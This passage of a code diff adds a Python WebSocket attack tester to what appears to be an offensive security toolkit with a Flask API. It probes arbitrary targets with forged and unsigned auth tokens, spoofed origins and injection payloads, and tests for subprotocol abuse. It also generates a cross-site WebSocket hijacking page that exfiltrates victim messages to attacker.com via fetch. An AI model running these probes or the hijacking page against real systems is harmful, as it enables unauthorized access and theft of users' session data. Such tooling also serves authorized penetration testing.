+                        "detail":   "WebSocket endpoint accepts upgrades",
+                    })
+                    break  # wss found, no need to try ws
+
+        return found
+
+    # ------------------------------------------------------------------ 2. auth bypass
+    def auth_bypass(self, ws_url: str) -> List[Dict]:
+        """Test WS connections with no/invalid/expired auth tokens."""
+        findings = []
+
+        test_cases = [
+            ("no_auth",          {}),
+            ("empty_token",      {"Authorization": "Bearer "}),
+            ("invalid_token",    {"Authorization": "Bearer invalid.token.here"}),
+            ("null_token",       {"Authorization": "Bearer null"}),
+            ("expired_token",    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJleHAiOjF9."}),
+            ("token_in_proto",   {"Sec-WebSocket-Protocol": "chat, token=invalid"}),
+        ]
+
+        for label, headers in test_cases:
+            r = self._ws_upgrade_check(ws_url, extra_headers=headers)
+            if r.get("upgraded"):
+                findings.append({
+                    "type":     "ws_auth_bypass",
+                    "variant":  label,
+                    "severity": "CRITICAL",
+                    "url":      ws_url,
+                    "detail":   f"WebSocket accepted connection with {label}",
+                })
+
+        return findings
+
+    # ------------------------------------------------------------------ 3. origin validation
+    def origin_check(self, ws_url: str) -> Dict:
+        """Test if the server validates the Origin header."""
+        import ssl as ssl_mod
+        issues  = []
+        origins = [
+            ("legitimate",   urllib.parse.urlparse(ws_url).netloc),
+            ("attacker",     "https://attacker.com"),
+            ("null",         "null"),
+            ("subdomain",    f"https://evil.{urllib.parse.urlparse(ws_url).netloc}"),
+            ("no_origin",    None),
+        ]
+
+        for label, origin in origins:
+            hdrs = {}
+            if origin:
+                hdrs["Origin"] = origin
+            r = self._ws_upgrade_check(ws_url, extra_headers=hdrs)
+            if r.get("upgraded") and label in ("attacker", "null", "subdomain"):
+                issues.append({
+                    "severity": "HIGH",
+                    "variant":  label,
+                    "origin":   origin,
+                    "detail":   f"WS connection accepted from untrusted origin '{origin}' — CSWSH possible",
+                })
+
+        return {
+            "issues":      issues,
+            "likely_vuln": bool(issues),
+            "severity":    "HIGH" if issues else "INFO",
+        }
+
+    # ------------------------------------------------------------------ 4. CSWSH PoC
+    def cswsh_poc(self, ws_url: str, attacker_origin: str = "https://attacker.com") -> Dict:
+        """Generate a Cross-Site WebSocket Hijacking PoC page."""
+        poc_html = f"""<!DOCTYPE html>
+<html>
+<head><title>CSWSH PoC</title></head>
+<body>
+<script>
+  var ws = new WebSocket("{ws_url}");
+  ws.onopen = function() {{
+    console.log("Connected! Sending auth probe...");
+    ws.send(JSON.stringify({{type:"ping"}}));
+  }};
+  ws.onmessage = function(e) {{
+    // Exfiltrate data to attacker server
+    fetch("https://attacker.com/collect?data=" + encodeURIComponent(e.data));
+    console.log("Received:", e.data);
+  }};
+  ws.onerror = function(e) {{ console.log("Error:", e); }};
+</script>
+<p>CSWSH PoC — data exfiltrated to attacker.com</p>
+</body>
+</html>"""
+        return {
+            "technique":      "CSWSH",
+            "ws_url":         ws_url,
+            "attacker_origin":attacker_origin,
+            "poc_html":       poc_html,
+            "severity":       "HIGH",
+            "description":    "Cross-Site WebSocket Hijacking PoC. If Origin validation fails, victim browsers connected to this page will leak their WS session to attacker.com.",
+        }
+
+    # ------------------------------------------------------------------ 5. message injection
+    def message_injection(self, ws_url: str) -> List[Dict]:
+        """Connect and send injection payloads, record reflections."""
+        import ssl as ssl_mod
+        findings = []
+        parsed   = urllib.parse.urlparse(ws_url)
+        host     = parsed.hostname
+        port     = parsed.port or (443 if parsed.scheme == "wss" else 80)
+        use_ssl  = parsed.scheme == "wss"
+
+        ws_key  = base64.b64encode(os.urandom(16)).decode()
+        handshake = (
+            f"GET {parsed.path or '/'} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
+            f"Sec-WebSocket-Key: {ws_key}\r\n"
+            f"Sec-WebSocket-Version: 13\r\n\r\n"
+        ).encode()
+
+        for payload_str in self.INJECTION_PAYLOADS[:6]:  # limit to first 6 for speed
+            try:
+                sock = socket.create_connection((host, port), timeout=8)
+                if use_ssl:
+                    ctx = ssl_mod.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode    = ssl_mod.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=host)
+                sock.sendall(handshake)
+                # Wait for 101
+                resp = b""
+                sock.settimeout(4)
+                try:
+                    while b"\r\n\r\n" not in resp:
+                        resp += sock.recv(1024)
+                except Exception:
+                    pass
+                if b"101" not in resp:
+                    sock.close()
+                    continue
+                # Send injection frame
+                self._send_ws_frame(sock, payload_str)
+                # Read response
+                reply = self._recv_ws_frame(sock, timeout=3)
+                sock.close()
+
+                if reply:
+                    reflected = any(
+                        fragment in reply
+                        for fragment in ["<script>", "alert(", "SELECT", "OR 1=1", "{{7*7}}", "49", "ls -la", "../../"]
+                        if fragment in payload_str
+                    )
+                    if reflected:
+                        findings.append({
+                            "type":       "ws_injection",
+                            "severity":   "HIGH",
+                            "url":        ws_url,
+                            "payload":    payload_str[:80],
+                            "reflection": reply[:200],
+                            "detail":     "Injected payload reflected in WS response",
+                        })
+            except Exception:
+                continue
+
+        return findings
+
+    # ------------------------------------------------------------------ 6. subprotocol abuse
+    def subprotocol_abuse(self, ws_url: str) -> List[Dict]:
+        """Test unusual/admin subprotocols."""
+        findings = []
+        protos   = ["admin", "debug", "internal", "superuser", "bypass",
+                    "chat, admin", "v1, admin", "raw"]
+        for proto in protos:
+            r = self._ws_upgrade_check(ws_url, extra_headers={"Sec-WebSocket-Protocol": proto})
+            if r.get("upgraded"):
+                resp_lower = r.get("response", "").lower()
+                if proto.split(",")[0].strip() in resp_lower or "websocket-protocol" in resp_lower:
+                    findings.append({
+                        "type":       "subprotocol_abuse",
+                        "severity":   "MEDIUM",
+                        "url":        ws_url,
+                        "protocol":   proto,
+                        "detail":     f"Server accepted subprotocol '{proto}'",
+                    })
+        return findings
+
+    # ------------------------------------------------------------------ orchestrator
+    def run(
+        self,
+        target:         str,
+        ws_url:         str          = "",
+        check_discovery:bool         = True,
+        check_auth:     bool         = True,
+        check_origin:   bool         = True,
+        check_cswsh:    bool         = True,
+        check_injection:bool         = True,
+        check_subproto: bool         = True,
+    ) -> Dict:
+        start   = time.time()
+        results = {}
+
+        if not target.startswith("http"):
+            target = "https://" + target
+
+        # Stage 1: discover WS endpoints
+        if check_discovery:
+            results["endpoints"] = self.discover_endpoints(target)
+
+        # Determine WS URL to test
+        active_ws = ws_url
+        if not active_ws and results.get("endpoints"):
+            active_ws = results["endpoints"][0]["url"]
+
+        if active_ws:
+            if check_auth:
+                results["auth_bypass"] = self.auth_bypass(active_ws)
+
+            if check_origin:
+                results["origin"] = self.origin_check(active_ws)
+
+            if check_cswsh:
+                results["cswsh"] = self.cswsh_poc(active_ws)
+
+            if check_injection:
+                results["injection"] = self.message_injection(active_ws)
+
+            if check_subproto:
+                results["subprotocol"] = self.subprotocol_abuse(active_ws)
+
+        # Aggregate
+        all_findings = []
+        for key, val in results.items():
+            if key == "endpoints":
+                continue
+            if isinstance(val, list):
+                all_findings.extend(val)
+            elif isinstance(val, dict):
+                if val.get("issues"):
+                    all_findings.extend(val["issues"])
+                elif val.get("likely_vuln") or val.get("severity") in ("CRITICAL", "HIGH"):
+                    all_findings.append(val)
+
+        sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0}
+        for f in all_findings:
+            s = f.get("severity", "MEDIUM")
+            sev_count[s] = sev_count.get(s, 0) + 1
+
+        return {
+            "target":          target,
+            "active_ws_url":   active_ws,
+            "results":         results,
+            "findings":        all_findings,
+            "total_findings":  len(all_findings),
+            "critical":        sev_count["CRITICAL"],
+            "high":            sev_count["HIGH"],
+            "medium":          sev_count["MEDIUM"],
+            "ws_found":        len(results.get("endpoints", [])),
+            "duration_sec":    round(time.time() - start, 2),
+        }
+
+
+ws_tester = WebSocketTester()
+
+
+@app.route("/api/tools/websocket/test", methods=["POST"])
+def websocket_test_route():
+    try:
+        params = request.json or {}
+        result = ws_tester.run(
+            target=params.get("target", ""),
+            ws_url=params.get("ws_url", ""),
+            check_discovery=bool(params.get("check_discovery", True)),
+            check_auth=bool(params.get("check_auth", True)),
+            check_origin=bool(params.get("check_origin", True)),
+            check_cswsh=bool(params.get("check_cswsh", True)),
+            check_injection=bool(params.get("check_injection", True)),
+            check_subproto=bool(params.get("check_subproto", True)),
+        )
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 websocket/test error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
